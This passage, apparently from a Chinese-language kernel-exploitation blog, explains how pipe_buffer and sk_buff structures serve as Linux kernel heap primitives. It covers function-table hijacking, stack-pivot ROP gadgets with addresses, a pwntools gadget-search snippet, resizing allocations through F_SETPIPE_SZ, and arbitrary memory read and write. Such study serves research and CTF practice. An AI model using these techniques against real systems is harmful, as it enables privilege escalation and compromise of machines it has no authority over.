<span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>存在如下调用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pipe_release()</span><br><span class="line">    put_pipe_info()</span><br><span class="line">        free_pipe_info()</span><br><span class="line">            pipe_buf_release()</span><br><span class="line">                pipe_buffer-&gt;pipe_buf_operations-&gt;release() // it should be anon_pipe_buf_release()</span><br></pre></td></tr></table></figure></div>
<p>在 <code>pipe_buf_release()</code> 中会调用到该
<code>pipe_buffer</code> 的函数表中的 <code>release</code> 指针：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pipe_buf_release - put a reference to a pipe_buffer</span></span><br><span class="line"><span class="comment"> * @pipe:	the pipe that the buffer belongs to</span></span><br><span class="line"><span class="comment"> * @buf:	the buffer to put a reference to</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">pipe_buf_release</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe,</span></span><br><span class="line"><span class="params">				    <span class="keyword">struct</span> pipe_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span> =</span> buf-&gt;ops;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	ops-&gt;release(pipe, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此我们只需要劫持其函数表到可控区域后再关闭管道的两端便能劫持内核执行流。当执行到该指针时
rsi 寄存器刚好指向对应的
<code>pipe_buffer</code>，因此我们可以将函数表劫持到
<code>pipe_buffer</code> 上，找到一条合适的 gadget
将栈迁移到该处，从而更顺利地完成 ROP。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/bc9cedb21d22912777a1ce7905ff8a42.png"
                     
alt="在这里插入图片描述" 
                > 常用 gadget 如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:FFFFFFFF81250C9D push    rsi</span><br><span class="line">.text:FFFFFFFF81250C9E pop     rsp</span><br><span class="line">.text:FFFFFFFF81250C9F cmp     rcx, rdx</span><br><span class="line">.text:FFFFFFFF81250CA2 jb      short loc_FFFFFFFF81250C85</span><br><span class="line">.text:FFFFFFFF81250CA4 pop     rbx</span><br><span class="line">.text:FFFFFFFF81250CA5 xor     eax, eax</span><br><span class="line">.text:FFFFFFFF81250CA7 pop     rbp</span><br><span class="line">.text:FFFFFFFF81250CA8 pop     r12</span><br><span class="line">.text:FFFFFFFF81250CAA jmp     __x86_return_thunk</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF82003240 retn</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">.text:FFFFFFFF817AD641 push    rsi</span><br><span class="line">.text:FFFFFFFF817AD642 pop     rsp</span><br><span class="line">.text:FFFFFFFF817AD643 xor     eax, eax</span><br><span class="line">.text:FFFFFFFF817AD645 test    edx, edx</span><br><span class="line">.text:FFFFFFFF817AD647 jnz     <span class="type">short</span> locret_FFFFFFFF817AD650</span><br><span class="line">.text:FFFFFFFF817AD647</span><br><span class="line">.text:FFFFFFFF817AD649 mov     rax, [rsi+<span class="number">90</span>h]</span><br><span class="line">.text:FFFFFFFF817AD649</span><br><span class="line">.text:FFFFFFFF817AD650</span><br><span class="line">.text:FFFFFFFF817AD650 locret_FFFFFFFF817AD650:                ; CODE XREF: .text:FFFFFFFF817AD647↑j</span><br><span class="line">.text:FFFFFFFF817AD650 retn</span><br></pre></td></tr></table></figure></div></p>
<p>调试时发现 edx = 0 因此也有下面这条 gadget 。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:FFFFFFFF8120B854 push    rsi</span><br><span class="line">.text:FFFFFFFF8120B855 pop     rsp</span><br><span class="line">.text:FFFFFFFF8120B856 test    edx, edx</span><br><span class="line">.text:FFFFFFFF8120B858 jle     loc_FFFFFFFF8120B8FB</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF8120B8FB ud2</span><br><span class="line">.text:FFFFFFFF8120B8FD mov     eax, 0FFFFFFEAh</span><br><span class="line">.text:FFFFFFFF8120B902 jmp     short loc_FFFFFFFF8120B89F</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF8120B89F pop     rbx</span><br><span class="line">.text:FFFFFFFF8120B8A0 pop     rbp</span><br><span class="line">.text:FFFFFFFF8120B8A1 pop     r12</span><br><span class="line">.text:FFFFFFFF8120B8A3 jmp     __x86_return_thunk</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF82003240 retn</span><br></pre></td></tr></table></figure></div> 可以通过
pwntools 查找。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;vmlinux&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> elf.search(asm(<span class="string">&#x27;push rsi; pop rsp;&#x27;</span>), executable = <span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span> elf.disasm(address = x, n_bytes = <span class="number">0x40</span>)</span><br><span class="line">    <span class="built_in">print</span></span><br></pre></td></tr></table></figure></div> ### 任意大小对象分配</p>
<p><code>pipe_buffer</code> 的分配过程，其实际上是单次分配
<code>pipe_bufs</code> 个 <code>pipe_buffer</code> 结构体：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br></pre></td></tr></table></figure></div>
<p>这里注意到 <code>pipe_bufs</code>
<strong>不是一个常量而是一个变量</strong>，pipe 系统调用提供了
<code>F_SETPIPE_SZ</code> <strong>让我们可以重新分配 pipe_buffer
并指定其数量</strong>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"></span><br><span class="line">	bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">round_pipe_size</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (size &gt; (<span class="number">1U</span> &lt;&lt; <span class="number">31</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Minimum pipe size, as required by POSIX */</span></span><br><span class="line">	<span class="keyword">if</span> (size &lt; PAGE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> roundup_pow_of_two(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	size = round_pipe_size(arg);</span><br><span class="line">	nr_slots = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line">    ...</span><br><span class="line">	ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">	<span class="keyword">if</span> (!pipe)</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">		ret = pipe_set_size(pipe, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>根据代码分析可知，<code>pipe_fcntl</code> 传入参数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>
时最终在 <code>pipe_resize_ring</code> 函数中 <code>kcalloc</code>
申请的内存大小为： <span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">⌊</mo><mfrac><msup><mn>2</mn><mrow><mo fence="true">⌈</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>n</mi><mo fence="true">⌉</mo></mrow></msup><msup><mn>2</mn><mn>12</mn></msup></mfrac><mo fence="true">⌋</mo></mrow><mo>×</mo><mtext>sizeof(struct pipe_buffer)</mtext></mrow><annotation encoding="application/x-tex">
\left \lfloor\frac{2^{\left \lceil \log_2n \right \rceil }}{2^{12}}\right \rfloor \times  \text{sizeof(struct pipe\_buffer)}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.515em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">⌊</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.565em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">⌈</span></span><span class="mop mtight"><span class="mop mtight"><span class="mtight">l</span><span class="mtight">o</span><span class="mtight" style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span style="top:-2.2341em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2659em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.1952em;"></span><span class="mord mathnormal mtight">n</span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">⌉</span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">⌋</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">sizeof(struct pipe_buffer)</span></span></span></span></span></span> <code>pipe_resize_ring</code>
函数的具体实现如下：</p>
<p>首先申请指定大小的内存：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">...</span><br><span class="line">   bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">	       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs))</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br></pre></td></tr></table></figure></div>
<p>检查新的大小是否小于当前 <code>pipe_buffer</code>
存放的内容，如果小于则更新 <code>pipe_buffer</code>
数量失败，释放申请的内存。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pipe_occupancy - Return number of slots used in the pipe</span></span><br><span class="line"><span class="comment"> * @head: The pipe ring head pointer</span></span><br><span class="line"><span class="comment"> * @tail: The pipe ring tail pointer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">pipe_occupancy</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> head, <span class="type">unsigned</span> <span class="type">int</span> tail)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> head - tail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	head = pipe-&gt;head;</span><br><span class="line">	tail = pipe-&gt;tail;</span><br><span class="line"></span><br><span class="line">	n = pipe_occupancy(head, tail);</span><br><span class="line">	<span class="keyword">if</span> (nr_slots &lt; n) &#123;</span><br><span class="line">		spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">		kfree(bufs);</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>
<p>将原有的 <code>pipe_buffer</code> 的内容复制到新的
<code>pipe_buffer</code> 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pipe array wraps around, so just start the new one at zero</span></span><br><span class="line"><span class="comment"> * and adjust the indices.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> h = head &amp; mask;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> t = tail &amp; mask;</span><br><span class="line">	<span class="keyword">if</span> (h &gt; t) &#123;</span><br><span class="line">		<span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,</span><br><span class="line">		       n * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> tsize = pipe-&gt;ring_size - t;</span><br><span class="line">		<span class="keyword">if</span> (h &gt; <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">memcpy</span>(bufs + tsize, pipe-&gt;bufs,</span><br><span class="line">			       h * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">		<span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,</span><br><span class="line">		       tsize * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>更新 <code>pipe_buffer</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">head = n;</span><br><span class="line">tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">pipe-&gt;bufs = bufs;</span><br><span class="line">pipe-&gt;ring_size = nr_slots;</span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;max_usage &gt; nr_slots)</span><br><span class="line">	pipe-&gt;max_usage = nr_slots;</span><br><span class="line">pipe-&gt;tail = tail;</span><br><span class="line">pipe-&gt;head = head;</span><br></pre></td></tr></table></figure></div>
<h3 id="任意地址读写">任意地址读写</h3>
<p>根据 <code>pipe_buffer</code> 读写数据的原理我们不难想到可以通过修改
<code>pipe_buffer</code> 中的 <code>page</code> 指针指向指定的
<code>page</code> 结构体并且修改 <code>offset</code> 和 <code>len</code>
就可以读写该 <code>page</code> 结构体中对应的内存页中的数据。</p>
<p>由于 <code>vmemmap_base</code> 指向的 <code>page</code>
数组与线性映射区的内存页的是线性映射的关系，因此在已知一个线性映射区的地址就可以读写该地址对应的数据。</p>
<p>至于非线性映射区的地址，我们可以先扫描线性映射区查找到进程的
<code>task_struct</code> 进而获取 <code>pgd</code>
，然后通过解析页表获取到该地址对应的物理地址，由于物理地址与线性映射区地址也是线性映射的关系，因此我们可以得到线性映射区中的地址，从而读写该地址对应的内存。
# sk_buff：内核中的“大对象菜单堆”</p>
<h2 id="sk_buffsize-512-的对象分配">sk_buff：size &gt;= 512
的对象分配</h2>
<p><code>sk_buff</code> 是 Linux kernel
网络协议栈中一个<strong>重要的基础结构体</strong>，其用以表示在网络协议栈中传输的一个「包」，但其结构体本身不包含一个包的数据部分，而是包含该包的各种属性，<strong>数据包的本体数据则使用一个单独的
object 储存</strong></p>
<p>这个结构体成员比较多，我们主要关注核心部分</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="comment">/* These two members must be first. */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">next</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">// ...</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* These elements must be at the end, see alloc_skb() for details.  */</span></span><br><span class="line">	<span class="type">sk_buff_data_t</span>		tail;</span><br><span class="line">	<span class="type">sk_buff_data_t</span>		end;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>		*head,</span><br><span class="line">				*data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		truesize;</span><br><span class="line">	<span class="type">refcount_t</span>		users;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span></span><br><span class="line">	<span class="comment">/* only useable after checking -&gt;active_extensions != 0 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_ext</span>		*<span class="title">extensions</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>sk_buff</code> 结构体与其所表示的数据包形成如下结构，其中：</p>
<ul>
<li><code>head</code>
：一个数据包<strong>实际的起始处</strong>（也就是为该数据包分配的 object
的首地址）</li>
<li><code>end</code> ：一个数据包实际的末尾（为该数据包分配的 object
的末尾地址）</li>
<li><code>data</code> ：<strong>当前所在 layer
的数据包对应的起始地址</strong></li>
<li><code>tail</code> ：<strong>当前所在 layer
的数据包对应的末尾地址</strong></li>
</ul>
<p>data 和 tail
可以这么理解：数据包每经过网络层次模型中的一层都会被添加/删除一个 header
（有时还有一个 tail），data 与 tail 便是用以对此进行标识的。多个
<code>sk_buff</code> 之间形成双向链表结构，类似于
<code>msg_queue</code>，这里同样有一个 <code>sk_buff_head</code>
结构作为哨兵节点。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/c26b0a11e0147c992ef2f2c8a04e07ee.png%20=70%x"
                     
alt="在这里插入图片描述" 
                > ### 分配（数据包：__GFP_NOMEMALLOC |
__GFP_NOWARN）</p>
<p>在内核网络协议栈中很多地方都会用到该结构体，例如读写 socket
一类的操作都会造成包的创建，其最终都会调用到 <code>alloc_skb()</code>
来分配该结构体，而这个函数又是 <code>__alloc_skb()</code> 的
wrapper，不过需要注意的是其会从<strong>独立的</strong>
<code>skbuff_fclone_cache</code>/ <code>skbuff_head_cache</code> 取
object。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">			    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="type">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">	cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">		? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">		gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get the HEAD */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; (SKB_ALLOC_FCLONE | SKB_ALLOC_NAPI)) == SKB_ALLOC_NAPI &amp;&amp;</span><br><span class="line">	    likely(node == NUMA_NO_NODE || node == numa_mem_id()))</span><br><span class="line">		skb = napi_skb_cache_get();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~GFP_DMA, node);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!skb))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	prefetchw(skb);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We do our best to align skb_shared_info on a separate cache</span></span><br><span class="line"><span class="comment">	 * line. It usually works because kmalloc(X &gt; SMP_CACHE_BYTES) gives</span></span><br><span class="line"><span class="comment">	 * aligned memory blocks, unless SLUB/SLAB debug is enabled.</span></span><br><span class="line"><span class="comment">	 * Both skb-&gt;head and skb_shared_info are cache line aligned.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = SKB_DATA_ALIGN(size);</span><br><span class="line">	size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> skb_shared_info));</span><br><span class="line">	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>
<p><code>sk_buff</code> 虽然是从独立的 <code>kmem_cache</code>
中分配的，<strong>但其对应的数据包不是</strong>，我们在这里注意到分配数据包时使用的是
<code>kmalloc_reserve()</code>，最终会调用到
<code>__kmalloc_node_track_caller()</code>，<strong>走常规的 kmalloc
分配路径</strong>，因此我们仍然可以实现近乎任意大小 object
的分配与释放。</p>
<p>因此 <code>sk_buff</code> 与 <code>msg_msg</code>
一样常被用来完成堆喷的工作，不同的是 <code>msg_msg</code> 带了一个
header，而 <code>sk_buff</code> 的数据包则带一个
tail——<code>skb_shared_info</code> 结构体。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/92b01e4f650bec3bae57d61c3fdf5a64.png%20=70%x"
                     
alt="在这里插入图片描述" 
                > <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> &#123;</span></span><br><span class="line">	__u8		flags;</span><br><span class="line">	__u8		meta_len;</span><br><span class="line">	__u8		nr_frags;</span><br><span class="line">	__u8		tx_flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>	gso_size;</span><br><span class="line">	<span class="comment">/* Warning: this field is not always filled in (UFO)! */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>	gso_segs;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>	*<span class="title">frag_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_hwtstamps</span> <span class="title">hwtstamps</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>	gso_type;</span><br><span class="line">	u32		tskey;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Warning : all fields before dataref are cleared in __alloc_skb()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">atomic_t</span>	dataref;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Intermediate layers must ensure that destructor_arg</span></span><br><span class="line"><span class="comment">	 * remains valid until skb destructor */</span></span><br><span class="line">	<span class="type">void</span> *		destructor_arg;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* must be last field, see pskb_expand_head() */</span></span><br><span class="line">	<span class="type">skb_frag_t</span>	frags[MAX_SKB_FRAGS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></p>
<p><code>skb_shared_info</code> 结构体的<strong>大小为 320
字节，这意味着我们能够利用分配的 object 最小的大小也得是 512
字节，这无疑为我们的利用增添了几分难度</strong>，但不可否认的是
<code>sk_buff</code> 仍为我们提供了较大对象的任意分配写入与释放。</p>
<h3 id="释放">释放</h3>
<p>我们只需要沿着发送的路径接收该包就能将其释放掉，例如若是我们通过向套接字中写入数据创建了一个包，则从套接字中读出该包便能将其释放</p>
<p>在内核中调用的是 <code>kfree_skb()</code>
函数进行释放，对于数据，其最终会调用到 <code>skb_release_data()</code>
，在这其中调用到 <code>skb_free_head()</code> 进行释放：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">skb_free_head</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *head = skb-&gt;head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		skb_free_frag(head);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		kfree(head);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而 <code>sk_buff</code> 本身则通过 <code>kfree_skbmem()</code>
进行释放，主要就是直接放入对应的 <code>kmem_cache</code> 中：</p>
